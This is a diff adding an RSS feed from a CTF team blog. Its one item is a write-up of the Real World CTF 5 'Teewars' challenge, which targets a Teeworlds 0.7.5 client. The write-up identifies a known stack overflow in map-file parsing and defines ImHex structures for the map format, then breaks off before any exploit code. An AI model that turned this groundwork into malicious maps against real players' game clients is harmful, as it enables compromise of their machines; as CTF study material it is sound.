@@ -1,0 +1,518 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>pwn on CyberTaskForce Zero</title>
+    <link>/tags/pwn/</link>
+    <description>Recent content in pwn on CyberTaskForce Zero</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© 2021-2022 CyberTaskForce Zero</copyright>
+    <lastBuildDate>Wed, 11 Jan 2023 19:51:16 +0100</lastBuildDate><atom:link href="/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Real World CTF 5 - Teewars</title>
+      <link>/posts/realworldctf5-teewars/</link>
+      <pubDate>Wed, 11 Jan 2023 19:51:16 +0100</pubDate>
+      
+      <guid>/posts/realworldctf5-teewars/</guid>
+      <description>Disclaimer We played as part of Sauercloud.
+Service This challenge targets a Teeworlds client. The provided service runs a client connecting with a server for retrieving a map and starting a multiplayer game. For interaction, a rust script is used which asks for the IP address of the server and forwards stdout and stderr of the client to us. Furthermore the Dockerfile for the service is provided. It compiles the current version, 0.</description>
+      <content>&lt;h1 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h1&gt;
+&lt;p&gt;We played as part of &lt;a href=&#34;https://ctftime.org/team/54748&#34;&gt;Sauercloud&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;service&#34;&gt;Service&lt;/h1&gt;
+&lt;p&gt;This challenge targets a Teeworlds client. The provided service runs a client connecting with a server for retrieving a map and starting a multiplayer game. For interaction, a rust script is used which asks for the IP address of the server and forwards &lt;code&gt;stdout&lt;/code&gt; and &lt;code&gt;stderr&lt;/code&gt; of the client to us. Furthermore the Dockerfile for the service is provided. It compiles the current version, 0.7.5, from source without PIE (&lt;code&gt;-no-pie&lt;/code&gt;) and stack canaries (&lt;code&gt;-fno-stack-protector&lt;/code&gt;).&lt;/p&gt;
+&lt;h1 id=&#34;vulnerability&#34;&gt;Vulnerability&lt;/h1&gt;
+&lt;p&gt;A quick search revealed &lt;a href=&#34;https://www.cvedetails.com/cve/CVE-2021-43518/&#34;&gt;CVE-2021-43518&lt;/a&gt;, which reports a stack buffer overflow in the given version. Attached to the CVE is a &lt;a href=&#34;https://mmmds.pl/fuzzing-map-parser-part-1-teeworlds/&#34;&gt;blog post&lt;/a&gt; and a &lt;a href=&#34;https://github.com/teeworlds/teeworlds/issues/2981&#34;&gt;github issue&lt;/a&gt; with additional information about this vulnerability. From the issue we can download a sample map triggering the overflow and find a merged &lt;a href=&#34;https://github.com/teeworlds/teeworlds/pull/3018&#34;&gt;pull reqeust&lt;/a&gt; fixing the overflow.&lt;/p&gt;
+&lt;p&gt;By looking at the fix, we can easily spot the buffer overflow occuring during the parsing of the map file in &lt;a href=&#34;https://github.com/teeworlds/teeworlds/blob/0.7.5/src/game/client/components/maplayers.cpp#L257&#34;&gt;&lt;code&gt;CMapLayers::LoadEnvPoints&lt;/code&gt;&lt;/a&gt;. So let&amp;rsquo;s first make an excurse to the map file format.&lt;/p&gt;
+&lt;h2 id=&#34;map-files&#34;&gt;Map files&lt;/h2&gt;
+&lt;p&gt;During this excurse we will build an &lt;a href=&#34;https://github.com/WerWolv/ImHex&#34;&gt;ImHex&lt;/a&gt; pattern for easier inspection and manipulation of map files during the exploit. ImHex offers a C-like &lt;a href=&#34;https://imhex.werwolv.net/docs/index.html&#34;&gt;pattern language&lt;/a&gt; to parse files, allowing the user to display and inspect binary files in a understandable, structured way. Apart from a slightly different a naming and some quality of live features, such as annotating structures with the result of functions, the main difference to C is the ability to use conditions and loops inside struct definitions.&lt;/p&gt;
+&lt;p&gt;A map file starts with a header followed by an index for faster access of items and data. After that, the items are saved and the file is concluded with data. In version 4 of the map file format, the data is compressed with zlib. Because ImHex does not support zlib inflate, we won&amp;rsquo;t look at it. But this is no problem, since the buffer overflow occurs during parsing of the EnvPoints, which are stored in an item (more about that later). As the placement of the data section is determined by the informations from the header, we should do the same to get view parity with Teeworlds. As ImHex parses the definitions from top to bottom, the following snippets must be prepended to the ones before.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CDataFile&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// header
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    CDatafileHeader header;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// index
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    CDatafileItemType m_pItemTypes[header.m_NumItemTypes];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_pItemOffsets[header.m_NumItems];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_pDataOffsets[header.m_NumRawData];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_pDataSizes[header.m_NumRawData];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// items
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    CDatafileItem items[header.m_NumItems];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// (zlib deflated) data
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; data[header.m_DataSize] &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt; addressof(items) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; header.m_ItemSize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// file starts at byte 0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;CDataFile file &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The header contains basic information about the map, including the version and the number of items and data entries and the total size of all items and data.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CDatafileHeader&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; m_aID[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];  &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#34;DATA&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Size;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Swaplen;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumItemTypes;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumItems;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumRawData;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ItemSize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_DataSize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The following array of item types just lists the start index and the number of items for each type present in the map. Teeworlds has 7 different item types. The relevant ones for the exploit will be the &lt;code&gt;Envelope&lt;/code&gt; and the &lt;code&gt;Envelope_Points&lt;/code&gt; item type. Since enums are strictly typed in ImHex and we will need the type later with only 16 bits, we will define the remaining two bytes as padding. This ignores the relevance of the last two bytes but allows us to reuse the enum later.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type_id&lt;/span&gt; : &lt;span style=&#34;color:#a6e22e&#34;&gt;s16&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Version &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Info &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Image &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Envelope &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Group &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Layer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Envelope_Points &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CDatafileItemType&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    type_id m_Type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    padding[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Start;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Num;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before looking into the different item types, let&amp;rsquo;s have a look at their common structure. Each item starts unique identifier formed by an ID unique in the scope of that item type and it&amp;rsquo;s type. This identifier is followed by the size of the following data. The definition of the data section illustrates the power of ImHex: depending on the type parsed earlier in the struct, we can specify different alternatives for the remaining content of the struct. By inlining the structs, we can flatten the hirachy. In addition, we will use a function to display ithe item&amp;rsquo;s type in the pattern view&amp;rsquo;s value column allowing us to see the item&amp;rsquo;s type without unfolding them.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show_type&lt;/span&gt;(auto to_show) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; to_show.m_Type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CDatafileItem&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s16 m_ID;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    type_id m_Type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Size;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Version) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemVersion version [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Info) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemInfo info [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Image) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemImage image [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Envelope) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemEnvelope envelope [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Group) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemGroup group [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Layer) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       CMapItemLayer layer [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; type_id::Envelope_Points) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CEnvPoint points[m_Size&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sizeof(CEnvPoint)] [[inline]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} [[format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;show_type&amp;#34;&lt;/span&gt;)]];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Despite not needing the other item types, we will shortly define them, as this allows us to get a better overview of the map file. Furthermore, this allows us to skip the parsing of the offsets by relying on their correctnes. The following definitions are copied from Teeworlds&amp;rsquo; &lt;a href=&#34;https://github.com/teeworlds/teeworlds/blob/0.7.5/src/game/mapitems.h&#34;&gt;&lt;code&gt;mapinfo.h&lt;/code&gt;&lt;/a&gt; and only adjusted by merging the different versions of the struct and changing their datatypes to the corresponding ones in ImHex. An explanation for the types can be found at the documentation of &lt;a href=&#34;https://github.com/heinrich5991/libtw2/blob/master/doc/map.md&#34;&gt;libtw2&lt;/a&gt;, a Rust implementation for some features of Teeworlds.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CPoint&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 x, y; &lt;span style=&#34;color:#75715e&#34;&gt;// 22.10 fixed point
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CColor&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 r, g, b, a;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CQuad&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CPoint m_aPoints[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CColor m_aColors[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CPoint m_aTexcoords[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_PosEnv;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_PosEnvOffset;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ColorEnv;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ColorEnvOffset;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CTile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; m_Index;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; m_Flags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; m_Skip;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; m_Reserved;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemInfo&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// enum { CURRENT_VERSION=1 };
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Author;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_MapVersion;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Credits;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_License;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;image_format&lt;/span&gt; : &lt;span style=&#34;color:#a6e22e&#34;&gt;s32&lt;/span&gt; {
